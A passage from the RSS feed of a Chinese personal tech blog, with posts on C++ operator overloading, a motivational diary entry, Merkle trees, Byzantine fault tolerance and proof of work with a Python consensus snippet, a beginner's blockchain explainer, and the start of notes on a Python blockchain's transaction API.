&quot;hello&quot;</code>，中，由于我们的运算符重载，可以使之识别C++里面的所有的<strong>基本类型</strong>。</p><hr><h3 id="运算符重载"><a href="#运算符重载" class="headerlink" title="运算符重载"></a>运算符重载</h3><blockquote><p>除了类属关系运算符”.”、成员指针运算符”.*”、作用域运算符”::”、sizeof运算符和三目运算符”?:”以外，C++中的所有运算符都可以重载。</p></blockquote><p>这里给出了运算符重载的一般格式。这样通过这个功能，我们可以实现自己的运算操作</p><pre><code>&lt;返回类型说明符&gt; operator &lt;运算符符号&gt;(&lt;参数表&gt;){     &lt;函数体&gt;}</code></pre><hr><p>在iostream类库中的 &lt;&lt; 就已经被重载为了插入运算符。而且实现的相当的巧妙。</p><pre><code>cout &lt;&lt; 88;//实际上对应的原型是ostream &amp; operator &lt;&lt; (int);</code></pre><p>这样就实现了 <code>&lt;&lt;</code> 对<code>int</code>的重载，使得我们可以输出。从上面的形式分析，其参数是int ，其返回的类型是一个ostream的引用。这个引用。是这个结构极为精妙的存在。</p><h3 id="拼接输出"><a href="#拼接输出" class="headerlink" title="拼接输出"></a>拼接输出</h3><pre><code>cout &lt;&lt; &quot;buzz&quot; &lt;&lt; &quot;fuzz&quot; &lt;&lt; endl;</code></pre><p>这一段代码，当然十分熟悉，拼接输出。可是具体是怎么实现的呢？？？这里的拼接，就是这个雷克十分精妙的地方</p><pre><code>ostream &amp; operator &lt;&lt; (ostream &amp;);</code></pre><p>当我们使用这个重载的运算符之后，返回的是一个ostream的引用。这样，我们可以继续使用 &lt;&lt; 运算符，实现一个拼接的输出。</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/03/30/%E5%89%91%E6%8C%87offer_1/#disqus_thread</comments>
    </item>
    
    <item>
      <title>日常励志</title>
      <link>https://www.diglp.xyz/2018/03/29/misc_%E4%B8%80%E5%91%A8%E6%9D%82%E8%AE%B0_5/</link>
      <guid>https://www.diglp.xyz/2018/03/29/misc_%E4%B8%80%E5%91%A8%E6%9D%82%E8%AE%B0_5/</guid>
      <pubDate>Wed, 28 Mar 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot;
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>现在已经是19年的第9周了，十分的苍白的一周。游手好闲，无所事事。自己在不写点东西，怕是心都要凉了。</p><p>心很乱，自己很难选择一条自己认为坚定的路。一个上午，在校园踱步，各种杂乱的想法在心头反翻滚。数十种声音在耳畔，鸟语，轰鸣，清风。千百种声音在心头，向左，向右，东进，西行。</p><p>很羡慕，那些可以果敢的实现自己想法的人，(或许他们有所思无所思)，大家可能会对他另眼，可是最终，他的目的是证明自己，那些另眼的人，也只有羡慕的机会了对吧？的确。明明很多时候是我们自己无法做到，我们有什么理由，凭着自己的臆断来另眼他人？</p><p>勇敢的改变，是艰难的一步，也将是最光辉的一步。勇敢的改变吧。向前方，向高处。勇敢的跳跃，自由的呐喊。不要被自己心中的所谓的常规二字所扼住喉咙。不要被自己的的最坏的猜想打消念头。勇敢的改变，改变。</p><blockquote><p>噪声和声音之间的界限是常规。</p></blockquote><p>常规？就在身边，我们所见见到的万物都是常规。打破常规的是噪音，打破常规的是音乐。</p><h2 id="少年"><a href="#少年" class="headerlink" title="少年"></a>少年</h2><blockquote><p>间歇性踌躇满志，持续性混吃等死</p></blockquote><p>看上去，这是一句笑谈。实际上，和现在的状态差不多。浑噩的状态会使人变得麻木，对自己这两个字会失去知觉。自己的明天？自己的希望？通通的失去知觉，心中存在的是一种空洞的状态，只是想着自己怎么完成现在手上的操作，而不是，实现自己的生活二字。没错，应该是忘了生活着二字。</p><p>斗志？从何而来？回想，有了以下结论：一时的冲动。结果的悔恨，未来的展望。缘何消失？自我的否定，热血的冷却，理想的忘却。</p><p>曾经，有个少年，在一个夜晚，在无人的楼顶，和我高谈着自己的想法，说自己认清了自己的行为荒废着时光。信誓旦旦的说，要学Java，要做Android的底层的开发找我希望问问我从何开始。我说好啊。只要你坚持，先从书开始看起吧。认识Java这一门语言就好啊。</p><p>没记错，那天是去年的秋。现在每每与他见面的时候，他的动作很固定，点击点击。只不过不是鼠标，而是屏幕。在一个荒岛上和敌人厮杀，语音中高喊着，想成为no1。当时有一种感伤，很难过吧，曾经那个感觉信仰燃烧的晚上，现在的表情却是如此的冰凉。</p><p>忘记，他忘记了自己的想法，和自己曾经小小的梦想吧。其实同样的，我也会恐惧，自己也成为这个样子。真正的恐惧，所以。古语有云:<code>三醒吾身</code>这句话没错，需要时时刻刻的进行自我修正(amend)。一次又一次的加强自己的意识，像是思想钢印。for better</p><p>事实上，一觉起来，感觉良好。这是十分可怕的一种现象，是个循环。怎么走出去？？</p><h2 id="后"><a href="#后" class="headerlink" title="后"></a>后</h2><p>无事，完</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/03/29/misc_%E4%B8%80%E5%91%A8%E6%9D%82%E8%AE%B0_5/#disqus_thread</comments>
    </item>
    
    <item>
      <title>MerkleTree与零知识证明</title>
      <link>https://www.diglp.xyz/2018/03/15/MerkleTree_2/</link>
      <guid>https://www.diglp.xyz/2018/03/15/MerkleTree_2/</guid>
      <pubDate>Wed, 14 Mar 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot; title=&quot;前&quot;&gt;&lt;/a&gt;前&lt;/h2&gt;&lt;p&gt;默克尔树这个数据结构，至于区块链就是他的骨架了。
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>默克尔树这个数据结构，至于区块链就是他的骨架了。 之前的文章对默克尔树是什么做了个十分十分简单的介绍。最近啃书，又看见了这个MerklerTree结构的介绍。对于其精妙之处再一次的感到。所以记录之。</p><h2 id="默克尔树简介"><a href="#默克尔树简介" class="headerlink" title="默克尔树简介"></a>默克尔树简介</h2><p>默克尔树，又名是哈希树。关于其较详细的简介可以看看之前的文章</p><blockquote><p><span class="exturl" data-url="aHR0cDovL2Jsb2cuZGlnbHAueHl6LzIwMTgvMDIvMjgvTWVya2xlVHJlZV8xLw==" title="http://blog.diglp.xyz/2018/02/28/MerkleTree_1/">什么是默克尔树<i class="fa fa-external-link"></i></span></p></blockquote><p>现在简单讲是一个哈希构成的二叉树了。</p><p>其主要的特性有</p><ul><li>最下面的叶子节点时包含的时存储数据和其哈希值</li><li>非叶子节点的值是他的两个孩子节点的内容的Hash</li></ul><p>在逻辑上讲，他们的父节点就是子节点的摘要。任何的数据改变将会最终的传递到根节点上。也正是这种性质成就了精巧的区块链体系。</p><hr><h2 id="默克尔树的作用"><a href="#默克尔树的作用" class="headerlink" title="默克尔树的作用"></a>默克尔树的作用</h2><h3 id="大量数据比较"><a href="#大量数据比较" class="headerlink" title="大量数据比较"></a>大量数据比较</h3><p>由于默克尔树的所有的存储数据都是存在于其叶子节点上，所有的非叶子节点是孩子节点的哈希。所以我们进行大文件比较时候。我们从根节点依次递归。每次找到当前的高度的存在hash差异节点。并且进入下一个高度。周而复始便可以找到我们存在差异的叶子节点。</p><p>所以根据这样的方法可以很快的找到差异数据块。如果只是进行文件的本身的对比，那么只需要对比根哈希即可。</p><h3 id="快速定位修改"><a href="#快速定位修改" class="headerlink" title="快速定位修改"></a>快速定位修改</h3><p>其实和上面的对比，这个差不多。我们的文件发生了根哈希改变，那么我们根据深度依次递归，找到了我们的最终变化的叶子节点就好了</p><hr><h2 id="零知识证明-zero-knowledge-proof"><a href="#零知识证明-zero-knowledge-proof" class="headerlink" title="零知识证明 (zero-knowledge proof)"></a>零知识证明 (zero-knowledge proof)</h2><p>这里是一个比较重要的点，所以把他放在最后。这个技术已经被很多的加密货币所采用比如较为有名的<strong>ZCash</strong>(零币)。在零币体系中就是使用了merkleTree的零知识证明的这一应用特性，实现了其招牌的匿名性。</p><blockquote><p>“零知识证明”－zero-knowledge proof，是由S.Goldwasser、S.Micali及C.Rackoff在20世纪80年代初提出的。它指的是证明者能够在不向验证者提供任何有用的信息的情况下，使验证者相信某个论断是正确的。</p></blockquote><p>这个是不是听着比较玄乎?不告诉你这个内容，又使你相信这个是真的。怎么做到呢?我们从下图入手。</p><p><img src="http://blog.diglp.xyz/images/BC_MK.jpeg" alt="MKT"></p><p>这个图所绘制的是一个十分简单的实现的默克尔树。</p><p>如果我要向其他人证明我是数据A的拥有者，却不可向其他人公布任何关于A的信息，那么要怎么做呢？</p><p>证明如下：我们可以公布Habcd，Hcd，Hb的值。我作为拥有者只需要提高我的数据的Hash即可。作为验证者只需要进行验证</p><pre><code>Habcd == H(H(a,b),Hcd);</code></pre><p>这样的一个等式即可，如果返回是True ，那么可以说明，你就是这个数据的 拥有者了，整个的过程是不需要涉及到数据A的数据信息的。</p><hr><p>我们进一步把这个证明贴近我们的生活中去,举个简单的例子：</p><p>A要向B证明自己拥有某个房间的钥匙，假设该房间只能用钥匙打开锁，而其他任何方法都打不开。这时有2个方法：</p><ol><li><p>A把钥匙出示给B，B用这把钥匙打开该房间的锁，从而证明A拥有该房间的正确的钥匙。</p></li><li><p>B确定该房间内有某一物体，A用自己拥有的钥匙打开该房间的门，然后把物体拿出来出示给B，从而证明自己确实拥有该房间的钥匙 。</p></li></ol><p>后面这个方法属于零知识证明。好处在于在整个证明的过程中，B始终不能看到钥匙的样子，从而避免了钥匙的泄露。</p><blockquote><p><span class="exturl" data-url="aHR0cDovL3d3dy5zb2h1LmNvbS9hLzEyMTg0Nzk0Ml80NzUzODQ=" title="http://www.sohu.com/a/121847942_475384">详细的ZCash的匿名转账的实现原理<i class="fa fa-external-link"></i></span></p></blockquote><h2 id="后面的话"><a href="#后面的话" class="headerlink" title="后面的话"></a>后面的话</h2><p>此文其实只是对以区块链技术的加密体系的初探。对新的知识做了粗浅的了解，不看也罢</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/03/15/MerkleTree_2/#disqus_thread</comments>
    </item>
    
    <item>
      <title>拜占庭将军与共识算法</title>
      <link>https://www.diglp.xyz/2018/03/14/BC_Byzantium/</link>
      <guid>https://www.diglp.xyz/2018/03/14/BC_Byzantium/</guid>
      <pubDate>Tue, 13 Mar 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot;
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>随着自己慢慢对BlockChain的基本原理的深入了解，对区块链的基本原理也是慢慢的有了清晰的了解。对共识，PoW，的概念也是更加清晰了。所以以此文来总结一下</p><h2 id="拜占庭将军问题"><a href="#拜占庭将军问题" class="headerlink" title="拜占庭将军问题"></a>拜占庭将军问题</h2><h3 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h3><p>首先什么是拜占庭将军(<code>Byzantine failures</code>)问题呢？这里引用一下百科:</p><blockquote><p>拜占庭位于如今的土耳其的伊斯坦布尔，是东罗马帝国的首都。由于当时拜占庭罗马帝国国土辽阔，为了防御目的，因此每个军队都分隔很远，将军与将军之间只能靠信差传消息。 在战争的时候，拜占庭军队内所有将军和副官必需达成一致的共识，决定是否有赢的机会才去攻打敌人的阵营。但是，在军队内有可能存有叛徒和敌军的间谍，左右将军们的决定又扰乱整体军队的秩序。在进行共识时，结果并不代表大多数人的意见。这时候，在已知有成员谋反的情况下，其余忠诚的将军在不受叛徒的影响下如何达成一致的协议，拜占庭问题就此形成。</p></blockquote><p>简单讲，就是一个军队中出了几个叛徒，我们怎么做，使得我们军队的意见表决的结果不会被这样叛徒改变。最终整个军队达成正确的共识。</p><h3 id="区块链中"><a href="#区块链中" class="headerlink" title="区块链中"></a>区块链中</h3><p>上面的就是拜占庭问题的起源，如果字多看着太麻烦，那么我们用自己的话简单的总结一下：</p><p>在我们的网络中存在着恶意节点，这些节点可能发送虚假的恶意消息，这样的节点我们就称之为<strong>拜占庭节点(Byzantine Node)</strong>。我们如何在网络存在着拜占庭节点的条件下保证我们整个区块链的所入链的区块依旧是正确的区块？也就是达成<strong>区块链共识</strong>，这样的问题就是我们区块链中的拜占庭将军问题。</p><p>实际上在区块链中，还有一类节点。他们可能出现故障(halting,crash)，对外界的信息没有响应。这样的不会发出拜占庭信息的单点故障我们称之非拜占庭故障。</p><h2 id="共识算法"><a href="#共识算法" class="headerlink" title="共识算法"></a>共识算法</h2><p>在区块链里面，用于解决上述的问题的算法我们就称之共识算法(Consensus Algorithm)。</p><p>上面的节点分为拜占庭节点和 故障节点。所以我们的共识算法也是分为两大类：<strong>Crash Fault Tolerance(CFT)和 Byzantine Fault Tolerance(BFT)</strong>。我们直接翻译过来，这里就是<strong>故障容错 和 拜占庭容错</strong>。</p><h3 id="区块链上"><a href="#区块链上" class="headerlink" title="区块链上"></a>区块链上</h3><p>了解了什么是共识算法之后，我们把它加在区块链上。像是比特币这样的<strong>公链</strong>(指的是人人可接入的区块链网络，类比于私链，联盟链)。由于其人人可接入的特性，当然导致了存在拜占庭节点的现象。可是我们的数据当然要保持绝对的正确，不能被拜占庭节点干扰。所以一个<strong>拜占庭容错的</strong>共识算法在比特币这一区块链体系下显得十分重要了！</p><h3 id="一个简单的共识算法"><a href="#一个简单的共识算法" class="headerlink" title="一个简单的共识算法"></a>一个简单的共识算法</h3><p>这里贴上的代码是一个用Python实现一个简易的区块链的<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3F1YXJ0ejAxMC9ibG9ja2NoYWlu" title="https://github.com/quartz010/blockchain">开源项目<i class="fa fa-external-link"></i></span>的代码节选。这代码就实现了一个十分简易的共识算法。项目地址在后面附上</p><p>这里随着段代码作一下分析。</p><pre><code>def resolve_conflicts(self):&quot;&quot;&quot;这里是实现的一个简单的共识算法，这里是使用最长链来替换本地的链，实现区块链共识:return: True if our chain was replaced, False if not&quot;&quot;&quot;neighbours = self.nodesnew_chain = None# 找到我们自己的区块高度max_length = len(self.chain)# 获取并且验证我们在网络上得到的区块for node in neighbours:    response = requests.get(f&apos;http://{node}/chain&apos;)        # 获取网络节点的完整链，    if response.status_code == 200:        length = response.json()[&apos;length&apos;]        # 得到区块高度        chain = response.json()[&apos;chain&apos;]        # 和当前的完整链        # 检查是否最长链，并且检验链的有效性        if length &gt; max_length and self.valid_chain(chain):        # 最长链，并进行合法性检验            max_length = length                new_chain = chain#  如果有效且最长，我们替换我们的本地链if new_chain:    self.chain = new_chain    return Truereturn False</code></pre><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3F1YXJ0ejAxMC9ibG9ja2NoYWlu" title="https://github.com/quartz010/blockchain">pyBlockChain项目地址<i class="fa fa-external-link"></i></span>（这个是笔者Fork的后面可能会自己拓展功能）</p></blockquote><p>关于其具体的实现和分析可以笔者的之前的文章<a href="blog.diglp.xyz/2018/03/11/pyMyBC_2/">Py区块链源码笔记 （2）P2P网络</a></p><hr><p>上面贴出的代码看上去十分简单，实际上也是十分简单。他意在在网络上站找到一个最长链，之后验证这个最长链的合法性(这点可以看看上面的文章的同一系列)。只要是合法的链，我们就直接替换掉我们的本地链。</p><p>可是这样的一个过程，到底是怎么解决区块链共识的问题呢？不就是要最长嘛，那我就编编编伪造一堆的虚假的区块数据让自己变得更长，那么不是轻轻松松在区块链实际翻云覆雨了，走上人生巅峰了？？</p><p>真的有这么简单吗？答案不用说当然是否定的，我们伟大的<strong>Satoshi</strong>先生当然不会忽略这点。这样我们的一个新的名词就要因此而生了：</p><p><strong>工作量证明(Proof of Work)</strong> 一般简写为PoW。</p><hr><h3 id="工作量证明的引入"><a href="#工作量证明的引入" class="headerlink" title="工作量证明的引入"></a>工作量证明的引入</h3><p>前面讲到，如果是单单的最长链的替换，那么谁都可以编编编从而使得这个网络崩溃，这里的工作量证明(Proof of Work)机制，十分巧妙的解决了这个问题。PoW 是一种基于概率的共识算法</p><p>如果在链圈币圈混过的那么对挖矿这个词一定不会陌生，没错挖矿就是PoW！听着很奇怪？老套路去看看什么是<strong>挖矿/PoW</strong>把。</p><p>还是笔者之前写的文章，一样的是Pyhton的简单区块链</p><blockquote><p>文章地址: <span class="exturl" data-url="aHR0cDovL2Jsb2cuZGlnbHAueHl6LzIwMTgvMDMvMDkvcHlNeUJDXzE=" title="http://blog.diglp.xyz/2018/03/09/pyMyBC_1">Py区块链源码笔记 （1）挖矿<i class="fa fa-external-link"></i></span></p></blockquote><hr><p>好，现在大家知道了什么是PoW了，那我们现在来看看这个共识到底是怎么实现的。刚刚说啥来着？我们需要找到网络中的最长链，那么我们就可以编对不对？现在一旦引入了PoW的机制，这样我们每个新的区块的产生是需要成本的，<strong>需要强大的Hash运算能力</strong>。所以我们编编编区块的这种想法是<strong>行不通</strong>的了</p><h4 id="重点"><a href="#重点" class="headerlink" title="重点"></a><strong>重点</strong></h4><p>那么我就自己计算嘛，自己编交易记录，自己计算自己把链编成可以吧？没错当然可以，不过现在体现<strong>比特币的去中心化的思想的时候就来了</strong>。<br>记住，比特币是公链，在网络上的所有的人都可以参与挖矿，随着挖矿的人数越来越多，整个网络的运算能力在极大幅度的提高。</p><p>那么由于Hash是不存在启发式算法的，所以谁的运算能力强，谁的爆块概率就大，这是线性的！所以算力强的就有大几率变成最长的区块。</p><p>所以可以看见，如果真的有一个拜占庭节点，想伪造区块记录，那么要有个必须条件：<strong>他必须具有极为强大的算力，使得自己的链始终是全网最长的</strong>，因为只有最长的链才会被矿工认为是有效的链！那么我不具有极为强的算力，在网络上编造的任何的区块都会是无效的。<strong>这便是比特币网络上的拜占庭容错</strong>。</p><h4 id="51-Attack"><a href="#51-Attack" class="headerlink" title="51% Attack"></a>51% Attack</h4><p>任何的容错机制都会有他的容错率，我们的比特币也是不例外的。51% 攻击就是比特币系统目前可见的最大的威胁。</p><blockquote><p>一提到对比特币的攻击，大部分人想到的就是51%攻击。所谓51%攻击，就是利用比特币使用算力作为竞争条件的特点，使用算力优势撤销自己已经发生的付款交易。如果有人掌握了50%以上的算力，他能够比其他人更快地找到开采区块需要的那个随机数，因此他实际上拥有了绝对哪个一区块的有效权利。</p></blockquote><p>他能够：</p><ol><li>修改自己的交易记录，这可以使他进行双重支付</li><li>阻止区块确认部分或者全部交易</li><li>阻止部分或全部矿工开采到任何有效的区块</li></ol><p>但是他无法做到：</p><ol><li>修改其他人的交易记录</li><li>阻止交易被发出去（交易会被发出，只是显示0个确认而已）</li><li>改变每个区块产生的比特币数量</li><li>凭空产生比特币</li><li>把不属于他的比特币发送给自己或其他人</li></ol><p>历史上已经发生过了51%攻击的案例了！</p><h3 id="25-威胁"><a href="#25-威胁" class="headerlink" title="25% 威胁"></a>25% 威胁</h3><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzIxOTc2MTgy" title="https://www.zhihu.com/question/21976182">比特币的自私挖矿<i class="fa fa-external-link"></i></span></p></blockquote><h2 id="后面的话"><a href="#后面的话" class="headerlink" title="后面的话"></a>后面的话</h2><p>本来是想找到BTC代码较以分析的，发现。。。还是有点困难。只能作罢。写博文的同时自己也是慢慢熟悉了和了解了这样的一个系统的精妙之处。<br>博文显得比较粗浅，笔者也是初学者，只能从较感性的层面分析这个逻辑的原理。后面也许会有深入理解系列</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/03/14/BC_Byzantium/#disqus_thread</comments>
    </item>
    
    <item>
      <title>What is BlockChain?</title>
      <link>https://www.diglp.xyz/2018/03/13/BC_What%20is%20BlockChain/</link>
      <guid>https://www.diglp.xyz/2018/03/13/BC_What%20is%20BlockChain/</guid>
      <pubDate>Mon, 12 Mar 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;p&gt;现在比特币这个词，相比对普通人来说也是越来越熟悉了。所以这一篇文章的定位是一篇科普文，希望大家可以通过这篇文章，至少可以理解这个是什么玩意。&lt;/p&gt;
&lt;p&gt;所谓区块链，就是比特币这种数字货币的底层技术。区块链这个名字虽然不是那么响亮，不过我真正的相信，这个将会是下一代的互联
          
        
      
      </description>
      
      <content:encoded><![CDATA[<p>现在比特币这个词，相比对普通人来说也是越来越熟悉了。所以这一篇文章的定位是一篇科普文，希望大家可以通过这篇文章，至少可以理解这个是什么玩意。</p><p>所谓区块链，就是比特币这种数字货币的底层技术。区块链这个名字虽然不是那么响亮，不过我真正的相信，这个将会是下一代的互联网。</p><h2 id="现在的互联网"><a href="#现在的互联网" class="headerlink" title="现在的互联网"></a>现在的互联网</h2><p>在现在的互联网，大家常常发送电子邮件。实际上发送的这些东西我们称之为信息。像是QQ文件之类的，我们发送的文件实际上只是一个副本（copy）。如果只是这些信息的话，我把他发给A，B，C是完全可能的。</p><p>可是，如果现在不是单纯的信息，而是100块钱，我把这100块发给你，你当然不会希望这是一个副本。</p><p>我只有100块，我给A发送100块，我又给B发送100块。在现代的互联网里面，这种保持价值的传递时无法做到的。可以说现代的互联网只能实现<strong>传播</strong>而不是<strong>传递</strong>。</p><p>那么，为了弥补这些缺陷，我们的信息价值重视被那些大的中介企业所担保。这里举个例子：我们日常生活中极为常用的支付宝，带着妹子去买东西，在付款的时候，我只是向云端传输了鉴权代码。商家就可以收到这100块了。这是怎么做到的？</p><p>没错，就是我们讲到的大的可信中介(支付宝)，因为大家信任它，所以这个机构是可信的。他维护者这个账本，当你付款了，他就很简单的你减去100，商家加上100。</p><p>上面描述的流程在生活中再常见不过了，感觉非常的合理。他们的业务和做法时相当的广泛，从身份认证，到结算记账，基本是对这个流程是无所不包的。<br>可是，实际上，其中的问题和威胁也是会慢慢的浮现：</p><hr><h3 id="集权化-centralization"><a href="#集权化-centralization" class="headerlink" title="集权化(centralization)"></a>集权化(centralization)</h3><p>由于这些巨型中介对所有的东西无所不包，人们对其只能够以信任为基础和支柱，这个信任一旦出现裂痕，那么这种模式将会出现历史性的倒退</p><p>其次，信息的安全保证，随着互联网的飞速的发展，信息安全这个point已经显得越来越重要。如果有组织想黑客军团里那样，清除了Evil公司的所有的财富数据，也必将是一场大乱</p><p>他们仅仅的少数的人，却可以把全球的数十亿人排除在经济这两个字之外。也正是这些中介的存在，拖慢了我们的信息的速度：比如我给美国的朋友发一封邮件，可能只需数秒，他就可以收到。可是一旦我的这个信息包含了100块的价值，<strong>可能需要几天，甚至几周</strong>才能漂洋过海的到达他的手里，而且在这流动的途中，各种的费用慢慢叠加，我们的信息的价值还会因此衰减。</p><p>再者，我们和这些大型的中介是严重的信息不对等的，我们提供了大量的个人信息，告诉他我们是谁，可是我们只能无条件的信任这些大的企业不会做恶。</p><hr><h2 id="实现价值的互联网"><a href="#实现价值的互联网" class="headerlink" title="实现价值的互联网"></a>实现价值的互联网</h2><p><strong>从比特币开始</strong></p><p>所以，为了实现这样的伟大构想，一个伟大的创举开始了，这个就是中本聪(Satoshi Nokamoto)提出的比特币(BitCoin)。这种货币根本构想是实现一个没有第三方的互信体系并可以进行交易。比特币作为一种数字资产，不同其他的国家法币。不过重点不在于这个货币(Currency)。而是其底层的技术，也就是区块链。</p><hr><p><strong>人人都有的账本</strong></p><p>所以，得力的区块链技术的核心，就是实现一个价值的互联网，而不单单是信息构成。这样我们就有了一个巨大的遍布全球的账本(ledger)，这帐本运行在世界上成千上万的计算机上。</p><p>我们生活中一切有价值的东西，像是电影，音乐，照片等等，都可以在这巨大的账本上面进行保存，转移，交易和互换。在这种情况下完全不需要有相关的中介参加这些过程，所有的一切都是可信的。</p><p>这一切是基于密码学实现的，所以他是可信的。</p><hr><h3 id="如何工作"><a href="#如何工作" class="headerlink" title="如何工作"></a>如何工作</h3><p>在这个区块链体系中，我们对我们的资产不是存储，而实把价值寄托在链上。由于人人都有一个账本，各个节点之间通过共识算法实现了弱一致性。所以你的资产会被绝大多数的节点所记录。</p><p>当你尝试发起一笔交易(transcation)的时候，你给这个消息进行一次签名，证明是你发起的(技术细节后面讲到)。之后把这个请求发送到互联网上，所有的节点彼此路由，很快传播到世界上所有的节点上。这个过程我们称之为 <strong>交易广播(Broadcast Transaction)</strong></p><p>接下来是一个重要的角色，叫做矿工(挖矿行业非同彼挖矿)，把交易数据进行合法性计算(你是否有足够的资产)，并且进行存储。每十分钟，像是比特币网络上的一个心跳，他们使用其强大的运算能力，始疯狂的计算一道数学题(PoS技术细节以后讲解)。这些人中只有一个获胜者。之后它可以把这个区块(含有数学题答案的)广播出去。说之间发现了这个区块。所有的节点开始验证答案是否正确(很快),如果正确，就把这个块入链。可以想到，十分钟的交易记录都加入到了这个链里面。这样，你的交易就被确认了呀</p><p>上面提到的入链，是区块链中的一个很重要的概念，上面产生的是一个区块，也就是十分钟所有的交易。如果大家知道hash，不懂也没关系，可以理解为指纹。我的当前区块会包含上一个区块的指纹，所以一旦新的区块产生，上一个区块的数据就变得不可改变了，或者说是很难改变。正是这种特性给区块链提供了无语伦比的安全性。</p><p>所以可见，区块链的精妙且强大的体系，是一种革命性的保障。</p><h2 id="代码即律"><a href="#代码即律" class="headerlink" title="代码即律"></a>代码即律</h2><p>上面我们描述了资产在区块链上流动的基本的工作原理。这里就是区块链技术的另一个拓展。</p><p>这个项目我们称之为以太坊(Ethereum),前面提到的区块链技术，提供里一个可信的平台，BTC实现的是一个货币。这里的以太坊实现的就是一个EVM(以太坊虚拟机)。</p><p>在这个虚拟机上，我们可以执行自己的图灵完备的代码，这样的代码我们称之为智能合约(Smart Contract)。顾名思义，我们可以在这个网络上签订各种的合约，而且前提是这些都是可信的。那么会有什么改变？</p><p>可以看到基本是场革命，我们的保险，贷款，征信等等等的东西，不在会有诈骗，不予执行这些人为欺骗和不可信的事情发生了！</p><h2 id="后面的话"><a href="#后面的话" class="headerlink" title="后面的话"></a>后面的话</h2><p>区块链作为一种新型的技术，想必已经得到了正视。在这大好浪潮之中，一场革命正在积蓄力量</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/03/13/BC_What%20is%20BlockChain/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Py区块链源码笔记 （3）交易</title>
      <link>https://www.diglp.xyz/2018/03/12/BC_pyMyBC_3/</link>
      <guid>https://www.diglp.xyz/2018/03/12/BC_pyMyBC_3/</guid>
      <pubDate>Sun, 11 Mar 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;p&gt;怎么学习区块链知识呢? 各种的资料看的头大，还是晕晕乎乎。所以那不如自己实现一个吧？？&lt;/p&gt;
&lt;p&gt;说是自己实现，实际上想先对&lt;span class=&quot;exturl&quot;
          
        
      
      </description>
      
      <content:encoded><![CDATA[<p>怎么学习区块链知识呢? 各种的资料看的头大，还是晕晕乎乎。所以那不如自己实现一个吧？？</p><p>说是自己实现，实际上想先对<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3F1YXJ0ejAxMC9ibG9ja2NoYWlu" title="https://github.com/quartz010/blockchain">源码<i class="fa fa-external-link"></i></span>进行解读。这里给出的源码，是一个基于Python实现的一个功能较为健全的区块链。下面给出项目地址</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3F1YXJ0ejAxMC9ibG9ja2NoYWlu" title="https://github.com/quartz010/blockchain">项目地址<i class="fa fa-external-link"></i></span></p></blockquote><h2 id="交易-transaction"><a href="#交易-transaction" class="headerlink" title="交易(transaction)"></a>交易(transaction)</h2><p>交易，是区块链里面实现价值传递的核心体现。如果在BTC的体系下，交易的本身是一个叫做<code>UTXO (Unspent Transaction Output)</code>的模型</p><p>这里分析两篇好的文章，了解一下UTXO的模型</p><blockquote><p><span class="exturl" data-url="aHR0cDovLzhidGMuY29tL2FydGljbGUtNDM4MS0xLmh0bWw=" title="http://8btc.com/article-4381-1.html">其实并没有什么比特币，只有 UTXO<i class="fa fa-external-link"></i></span></p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzU5OTEzMzAx" title="https://www.zhihu.com/question/59913301">比特币UTXO的原理<i class="fa fa-external-link"></i></span></p></blockquote><p>实际上我们的每笔币的转移，都是一条由我们的私钥进行签名的一条数据</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9ja2NoYWluLmluZm8vemgtY24vdHgvZGM3YWMzMTliYmQ2MmYyNDYxMGEyYmY3OWI3N2VjZGQ1MDM2M2VkNThmN2ZmMjNmY2Q1ZWM3NDEwMWVmNzcwMQ==" title="https://blockchain.info/zh-cn/tx/dc7ac319bbd62f24610a2bf79b77ecdd50363ed58f7ff23fcd5ec74101ef7701">区块数据<i class="fa fa-external-link"></i></span></p></blockquote><p>由上面的数据我们可见，去数据是由输入和输出两部分。</p><hr><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p><strong>Web后端代码</strong></p><p>这里贴出的是后端代码，由函数名可以很容易的知道，这个是发起一个新的交易。是用户使用post提交的请求。之后创建新的交易。</p><pre><code>@app.route(&apos;/transactions/new&apos;, methods=[&apos;POST&apos;])def new_transaction():    # 取得用户提交的json    values = request.get_json()    # 检查用户的Post的json是否合法    required = [&apos;sender&apos;, &apos;recipient&apos;, &apos;amount&apos;]    if not all(k in values for k in required):        # 是否包含这里的所有的键        return &apos;Missing values&apos;, 400    # 这里开始创建一个交易    index = blockchain.new_transaction(values[&apos;sender&apos;], values[&apos;recipient&apos;], values[&apos;amount&apos;])    response = {&apos;message&apos;: f&apos;Transaction will be added to Block {index}&apos;}    return jsonify(response), 